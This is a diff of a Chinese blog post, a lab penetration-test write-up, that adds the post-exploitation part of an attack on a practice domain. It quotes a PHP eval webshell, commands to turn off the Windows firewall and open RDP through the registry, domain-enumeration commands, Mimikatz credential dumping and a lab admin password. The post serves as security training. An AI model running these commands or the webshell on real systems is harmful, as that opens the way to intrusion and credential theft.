@@ -54,8 +54,25 @@
 <meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/22.png">
 <meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/23.png">
 <meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/24.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/25.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/26.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/17.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/27.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/28.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/29.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/30.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/31.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/32.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/33.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/34.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/35.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/36.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/37.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/38.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/39.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/40.png">
 <meta property="article:published_time" content="2021-05-14T12:00:13.000Z">
-<meta property="article:modified_time" content="2021-05-22T13:36:22.271Z">
+<meta property="article:modified_time" content="2021-05-24T13:16:10.868Z">
 <meta property="article:author" content="swanQ">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="靶场">
@@ -214,7 +231,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-22 21:36:22" itemprop="dateModified" datetime="2021-05-22T21:36:22+08:00">2021-05-22</time>
+                <time title="修改时间：2021-05-24 21:16:10" itemprop="dateModified" datetime="2021-05-24T21:16:10+08:00">2021-05-24</time>
               </span>
 
           <br>
@@ -223,14 +240,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.4k</span>
+              <span>3.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -304,8 +321,6 @@
 <p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p>
 <p><img src="/2021/05/14/PenetrationRange/20.png"></p>
 <p>使用蚁剑连接一句话木马<code>http://192.168.140.130/hack.php</code>。web目录直接IP加文件名就好。</p>
-<h3 id="漏洞六：yxcms后台SQL注入漏洞"><a href="#漏洞六：yxcms后台SQL注入漏洞" class="headerlink" title="漏洞六：yxcms后台SQL注入漏洞"></a>漏洞六：yxcms后台SQL注入漏洞</h3><p>待补充。其他博客的资料此处有问题。</p>
-<p>前渗透到此结束，下面为后渗透流程</p>
 <h2 id="0x03-getshell"><a href="#0x03-getshell" class="headerlink" title="0x03 getshell"></a>0x03 getshell</h2><p>此时会用到Cobalt Strike, 以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p>
 <p>我们用kali作为CS服务器，用蚁剑给win7上传java 11和CS。CS服务器和CS客户端分别如下：</p>
 <p><img src="/2021/05/14/PenetrationRange/21.png"></p>
@@ -313,8 +328,76 @@
 <p>选择监听器，为后头生成木马做铺垫</p>
 <p>蚁剑关闭防火墙：终端执行：netsh advfirewall set allprofiles state off</p>
 <p><img src="/2021/05/14/PenetrationRange/23.png"></p>
-<p>生成木马artifact.exe.（Attacks -&gt; Packages -&gt; Windows Executable ）,并用蚁剑上传win7。用蚁剑终端执行artifact.exe之后，win7提示artifact.exe已停止工作。</p>
+<p>生成木马artifact.exe.（Attacks -&gt; Packages -&gt; Windows Executable ）,并用蚁剑上传win7。用蚁剑终端执行artifact.exe之后，win7提示artifact.exe已停止工作。发现是监听主机选错了，当然是要选择攻击方(服务器)。当然记得要选择为64位。</p>
+<p>tips:</p>
+<p>相同文件名的shell，蚁剑会上传失败。</p>
 <p><img src="/2021/05/14/PenetrationRange/24.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/25.png"></p>
+<p>终于提权成功了。</p>
+<h2 id="0x04-后渗透之系统信息收集"><a href="#0x04-后渗透之系统信息收集" class="headerlink" title="0x04 后渗透之系统信息收集"></a>0x04 后渗透之系统信息收集</h2><p>对这台主机进行信息收集</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> shell ipconfig/all</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/14/PenetrationRange/26.png"></p>
+<p>我们知道140是外网，还发现52网段。域是god.org，说明当前主机是在域内的，初步判断域名为god.org.</p>
+<blockquote>
+<p>内网信息收集：</p>
+<p>查询主机名：whoami，hostname</p>
+<p>查询系统体系架构：echo %PROCESSOR_ARCHITECTURE%</p>
+<p>查看当前运行进程：wmic process list brief</p>
+<p>域相关：</p>
+<p>查询本地所有用户：net user</p>
+<p>查看域内所有用户列表：net group /domain  </p>
+<p>进入域：net group /domain:god</p>
+<p>查看域成员计算机列表：net group “domain computers” /domain<br>查看域管理员用户，也就是域控：net group “domain admins” /domain </p>
+<p>参考：<a target="_blank" rel="noopener" href="https://article.itxueyuan.com/56bEWk">https://article.itxueyuan.com/56bEWk</a></p>
+</blockquote>
+<p>查看本机名，hostname,架构，域信息等，CSshell执行命令实在是太慢了，最好用蚁剑吧。后来发现是自己没改sleep时间，一般改成5就行。</p>
+<p>查看是否有常见的杀毒软件</p>
+<p><img src="/2021/05/14/PenetrationRange/17.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/27.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/28.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/29.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/30.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/31.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/32.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/33.png"></p>
+<p>本机计算机名为STU1，还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p>
+<h3 id="1-主机密码收集"><a href="#1-主机密码收集" class="headerlink" title="1. 主机密码收集"></a>1. 主机密码收集</h3><p>获取win7系统用户名和密码</p>
+<p>连接右键-&gt;Access-&gt;Run Mimikaz/Dump Hashes</p>
+<p>view -&gt; Credentials</p>
+<p><img src="/2021/05/14/PenetrationRange/34.png"></p>
+<h3 id="2-远程桌面登陆"><a href="#2-远程桌面登陆" class="headerlink" title="2.远程桌面登陆"></a>2.远程桌面登陆</h3><p>要使用远程桌面登陆的话，得远程开启对方的3389端口，不妨试试。因为之前防火墙已经关了，所以此时不再需要。</p>
+<p><img src="/2021/05/14/PenetrationRange/35.png"></p>
+<p>whoami的信息是god\administrator，密码是Security1</p>
+<p>此时远程桌面登陆：</p>
+<p><img src="/2021/05/14/PenetrationRange/36.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/37.png"></p>
+<p>尝试多次一直登陆失败，是把用户名记成god，执行whoami看到是god\administrator。</p>
+<blockquote>
+<p>注：</p>
+<p>注册表开启3389端口：<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t  REG_DWORD /d 00000000 /f</p>
+<p>关闭防火墙：</p>
+<p>winsows server 2003 之前：</p>
+<p>netsh firewall set opmode disable       </p>
+<p>winsows server 2003 之后：<br>netsh advfirewall set allprofiles state off     </p>
+</blockquote>
+<h2 id="0x05-内网信息收集"><a href="#0x05-内网信息收集" class="headerlink" title="0x05 内网信息收集"></a>0x05 内网信息收集</h2><ul>
+<li><p> 域控制用户：OWA</p>
+</li>
+<li><p>本机计算机：STU1，</p>
+</li>
+<li><p>域成员：DEV1、ROOT-TVI862UBEH</p>
+</li>
+</ul>
+<p>远程登陆之后发现win7已安装nmap，不妨利用起来，直接进行内网扫描。nmap -sP。在此一提，其实CS 右键Explore -&gt; Desktop(VNC)也可以直接远程桌面，感概CS的强大。</p>
+<p>k8师傅的Ladon也可以直接进行内网扫描：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.52.0&#x2F;24 OnlinePC</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/14/PenetrationRange/38.png"></p>
+<p>beacon上右键-&gt;Explore -&gt; PortScan</p>
+<p><img src="/2021/05/14/PenetrationRange/39.png"></p>
+<p>icmp扫描完之后，在view-&gt;target选项即可看到内网存活主机。</p>
+<p><img src="/2021/05/14/PenetrationRange/40.png"></p>
 
     </div>
 
@@ -402,7 +485,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">1. 环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">2. 攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%80%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.2.1.</span> <span class="nav-text">漏洞一：信息泄露+弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%8C%EF%BC%9APhpMyAdmin%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.2.2.</span> <span class="nav-text">漏洞二：PhpMyAdmin弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%89%EF%BC%9Ayxcms%E7%95%99%E8%A8%80%E6%9C%ACXSS%E5%AD%98%E5%82%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.3.</span> <span class="nav-text">漏洞三：yxcms留言本XSS存储型漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9B%9B%EF%BC%9Ayxcms%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.4.</span> <span class="nav-text">漏洞四：yxcms后台任意文件读写漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%94%EF%BC%9APhpMyAdmin%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell"><span class="nav-number">2.2.5.</span> <span class="nav-text">漏洞五：PhpMyAdmin开启全局日志getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%85%AD%EF%BC%9Ayxcms%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.6.</span> <span class="nav-text">漏洞六：yxcms后台SQL注入漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-getshell"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 getshell</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">1. 环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">2. 攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%80%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.2.1.</span> <span class="nav-text">漏洞一：信息泄露+弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%8C%EF%BC%9APhpMyAdmin%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.2.2.</span> <span class="nav-text">漏洞二：PhpMyAdmin弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%89%EF%BC%9Ayxcms%E7%95%99%E8%A8%80%E6%9C%ACXSS%E5%AD%98%E5%82%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.3.</span> <span class="nav-text">漏洞三：yxcms留言本XSS存储型漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9B%9B%EF%BC%9Ayxcms%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.4.</span> <span class="nav-text">漏洞四：yxcms后台任意文件读写漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%94%EF%BC%9APhpMyAdmin%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell"><span class="nav-number">2.2.5.</span> <span class="nav-text">漏洞五：PhpMyAdmin开启全局日志getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-getshell"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.4.</span> <span class="nav-text">0x04 后渗透之系统信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86"><span class="nav-number">2.4.1.</span> <span class="nav-text">1. 主机密码收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%99%BB%E9%99%86"><span class="nav-number">2.4.2.</span> <span class="nav-text">2.远程桌面登陆</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.5.</span> <span class="nav-text">0x05 内网信息收集</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -416,7 +499,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -425,7 +508,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-count">45</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
